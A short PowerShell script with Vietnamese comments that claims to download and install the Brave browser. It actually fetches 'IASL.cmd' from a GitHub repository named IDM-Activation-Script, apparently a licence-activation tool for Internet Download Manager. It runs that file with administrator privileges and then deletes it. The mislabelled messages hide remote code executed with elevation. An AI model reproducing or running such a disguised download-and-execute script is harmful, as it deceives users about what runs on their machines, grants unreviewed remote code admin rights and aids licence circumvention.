# Script để tải xuống và cài đặt Brave
# Chạy với quyền quản trị viên (Run as Administrator)

$Path = $ENV:TEMP
$Installer = "IASL.cmd"

Write-Host "Dang tai xuong Brave..."

# Tải file cài đặt
Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/IASL.cmd" -OutFile "$Path\$Installer"
Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/src/banner_art.txt" -OutFile "$Path\src"

Write-Host "Da tai xuong thanh cong."
Write-Host "Dang bat dau qua trinh cai dat..."

# Run the installer in silent mode with administrator privileges
Start-Process -FilePath "$Path\$Installer" -Verb RunAs -Wait

Write-Host "Cai dat hoan tat."
Write-Host "Dang don dep file cai dat..."

# Delete the downloaded installer file
Remove-Item "$Path\$Installer" -ErrorAction SilentlyContinue

Write-Host "Hoan tat."